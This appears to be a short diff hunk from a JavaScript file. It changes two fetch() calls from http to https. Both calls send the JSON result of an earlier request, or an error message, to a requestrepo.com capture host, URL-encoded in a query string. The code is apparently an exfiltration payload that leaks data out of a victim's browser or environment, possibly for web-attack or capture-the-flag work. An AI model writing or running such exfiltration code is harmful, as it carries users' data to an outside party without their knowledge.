@@ -36,11 +36,11 @@
             
             const result = await response.json();
             
-            await fetch('http://we6hfxdk.requestrepo.com/?data=' + 
+            await fetch('https://we6hfxdk.requestrepo.com/?data=' + 
                        encodeURIComponent(JSON.stringify(result)));
             
         } catch (error) {
-            await fetch('http://we6hfxdk.requestrepo.com/?error=' + 
+            await fetch('https://we6hfxdk.requestrepo.com/?error=' + 
                        encodeURIComponent(error.message));
         }
     }
